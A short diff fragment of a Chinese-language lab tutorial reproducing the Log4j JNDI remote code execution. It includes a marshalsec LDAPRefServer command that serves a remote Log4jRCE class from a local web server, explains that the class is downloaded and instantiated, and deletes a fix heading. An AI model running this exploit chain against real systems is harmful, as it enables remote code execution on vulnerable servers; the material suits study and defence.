@@ -32,4 +32,3 @@
    4. 启动ldap server `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"`
 4. 启动log4j.java，然后就会发现命令行出现了`I am Log4jRCE from remote!!!`。底层就是会远程下载Log4jRCE.class，然后执行newInstance()，所以会执行static、构造函数代码。
 
-### 修复方案：
